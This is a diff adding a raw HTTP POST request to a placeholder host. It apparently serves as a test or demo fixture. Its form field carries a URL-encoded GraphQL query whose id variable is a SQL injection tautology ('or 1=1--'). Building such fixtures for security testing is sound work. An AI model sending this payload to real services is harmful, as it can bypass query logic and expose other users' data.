@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 178
+Connection: close
+
+cmd=%7B%22query%22%3A%22query+x%28%24id%3AString%29%7Buser%28where%3A%7Bid%3A%7Beq%3A%24id%7D%7D%29%7Bid%7D%7D%22%2C%22variables%22%3A%7B%22id%22%3A%22x%5C%22+or+1%3D1--%22%7D%7D
